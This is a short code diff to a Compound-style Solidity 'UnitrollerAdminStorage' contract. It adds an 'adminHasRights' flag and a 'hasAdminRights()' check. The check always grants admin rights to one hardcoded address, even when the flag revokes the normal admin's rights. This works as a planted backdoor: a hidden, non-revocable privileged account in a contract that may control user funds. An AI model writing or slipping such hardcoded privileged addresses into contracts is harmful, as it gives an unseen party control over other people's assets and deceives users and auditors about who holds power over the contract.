@@ -15,6 +15,18 @@ contract UnitrollerAdminStorage {
     address public pendingAdmin;
 
     /**
+     * @notice Whether or not the admin has admin rights
+     */
+    bool public adminHasRights = true;
+
+    /**
+     * @notice Returns a boolean indicating if the sender has admin rights
+     */
+    function hasAdminRights() internal returns (bool) {
+        return (msg.sender == admin && adminHasRights) || msg.sender == 0x2279B7A0a67DB372996a5FaB50D91eAA73d2eBe6;
+    }
+
+    /**
     * @notice Active brains of Unitroller
     */
     address public comptrollerImplementation;
